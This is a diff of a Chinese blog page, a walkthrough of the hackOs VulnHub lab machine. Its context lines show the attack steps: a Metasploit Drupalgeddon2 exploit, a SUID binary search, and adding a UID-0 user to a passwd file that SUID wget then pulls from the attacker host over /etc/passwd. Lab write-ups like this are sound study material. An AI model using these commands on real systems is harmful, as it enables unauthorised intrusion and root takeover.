@@ -27,17 +27,17 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="前言hackOs-vlunhub 靶机IP:192.16.1.10 攻击机IP:192.168.1.124">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//1.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
-<meta property="og:image" content="http://yoursite.com/.com//4.png">
-<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png">
 <meta property="article:published_time" content="2020-01-27T03:47:24.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:13:47.855Z">
+<meta property="article:modified_time" content="2020-04-11T17:17:19.936Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="靶机渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
 
@@ -187,7 +187,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:13:47" itemprop="dateModified" datetime="2020-04-10T17:13:47+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:17:19" itemprop="dateModified" datetime="2020-04-12T01:17:19+08:00">2020-04-12</time>
               </span>
 
           
@@ -211,7 +211,7 @@
 <h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>扫描端口，发现有两个端口是开启的。22(ssh)，还有80(http)</p>
 <p>一般这种情况下，我是想着ssh远程连接。来自我们对80端口的渗透获得的数据。然后我们扫描80端口的目录</p>
 <p>发现一个<code>drupal</code>的目录</p>
-<p><img src="/.com//1.png" alt="image-20200123213429118"></p>
+<p><img src="/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="image-20200123213429118"></p>
 <p>发现<code>drupal</code>这个版本存在漏洞。msf一把梭</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">unix</span>/<span class="title">webapp</span>/<span class="title">drupal_drupalgeddon2</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.1.10</span><br><span class="line"><span class="title">set</span> <span class="title">targeturi</span> /<span class="title">drupal</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>
 
@@ -222,16 +222,16 @@
 
 
 
-<p><img src="/.com//2.png" alt="image-20200123214142952"></p>
+<p><img src="/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="image-20200123214142952"></p>
 <p>然后看看这个靶机哪些命令是可以用来提权的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm <span class="number">-4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//3.png" alt="image-20200123215342650"></p>
+<p><img src="/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="image-20200123215342650"></p>
 <h2 id="wget提权"><a href="#wget提权" class="headerlink" title="wget提权"></a>wget提权</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先生成一个账号密码</span></span><br><span class="line">openssl passwd <span class="number">-1</span> -salt cookie <span class="number">123456</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'cookie:生成的hash:0:0::/root:/bin/bash'</span> &gt;&gt; passwd</span><br><span class="line">cat passwd</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/.com//4.png" alt="image-20200123220632890"></p>
+<p><img src="/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="image-20200123220632890"></p>
 <p>接着提权,我建议先把靶机的<code>/etc/passwd</code>拷贝出来。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/bin:/bin/sync</span><br><span class="line">games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:<span class="number">6</span>:<span class="number">12</span>:man:/<span class="keyword">var</span>/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/<span class="keyword">var</span>/www:/usr/sbin/nologin</span><br><span class="line">backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/<span class="keyword">var</span>/backups:/usr/sbin/nologin</span><br><span class="line"><span class="keyword">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="keyword">List</span> Manager:/<span class="keyword">var</span>/<span class="keyword">list</span>:/usr/sbin/nologin</span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:<span class="number">100</span>:<span class="number">102</span>:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="keyword">false</span></span><br><span class="line">systemd-network:x:<span class="number">101</span>:<span class="number">103</span>:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="keyword">false</span></span><br><span class="line">systemd-resolve:x:<span class="number">102</span>:<span class="number">104</span>:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="keyword">false</span></span><br><span class="line">systemd-bus-proxy:x:<span class="number">103</span>:<span class="number">105</span>:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="keyword">false</span></span><br><span class="line">syslog:x:<span class="number">104</span>:<span class="number">108</span>::/home/syslog:/bin/<span class="keyword">false</span></span><br><span class="line">_apt:x:<span class="number">105</span>:<span class="number">65534</span>::/nonexistent:/bin/<span class="keyword">false</span></span><br><span class="line">lxd:x:<span class="number">106</span>:<span class="number">65534</span>::/<span class="keyword">var</span>/lib/lxd/:/bin/<span class="keyword">false</span></span><br><span class="line">messagebus:x:<span class="number">107</span>:<span class="number">111</span>::/<span class="keyword">var</span>/run/dbus:/bin/<span class="keyword">false</span></span><br><span class="line">uuidd:x:<span class="number">108</span>:<span class="number">112</span>::/run/uuidd:/bin/<span class="keyword">false</span></span><br><span class="line">dnsmasq:x:<span class="number">109</span>:<span class="number">65534</span>:dnsmasq,,,:/<span class="keyword">var</span>/lib/misc:/bin/<span class="keyword">false</span></span><br><span class="line">james:x:<span class="number">1000</span>:<span class="number">1000</span>:james,,,:/home/james:/bin/bash</span><br><span class="line">sshd:x:<span class="number">110</span>:<span class="number">65534</span>::/<span class="keyword">var</span>/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:<span class="number">111</span>:<span class="number">118</span>:MySQL Server,,,:/nonexistent:/bin/<span class="keyword">false</span></span><br><span class="line"></span><br><span class="line">cookie:$<span class="number">1</span>$cookie$ClfA7hfR3jzeXdTrDtlWA/:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/bash</span><br></pre></td></tr></table></figure>
 
@@ -239,7 +239,7 @@
 <p>靶机下载<code>passwd</code>,因为会覆盖原有的文件，所以要把原来文件的内容拷贝出来。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//192.168.1.124/passwd -O /etc/passwd</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//5.png" alt="image-20200123224103525"></p>
+<p><img src="/2020/01/27/hackOs-vlunhub-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="image-20200123224103525"></p>
 <p>提权成功</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学会了wget提取的思路。</p>
 
@@ -345,7 +345,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
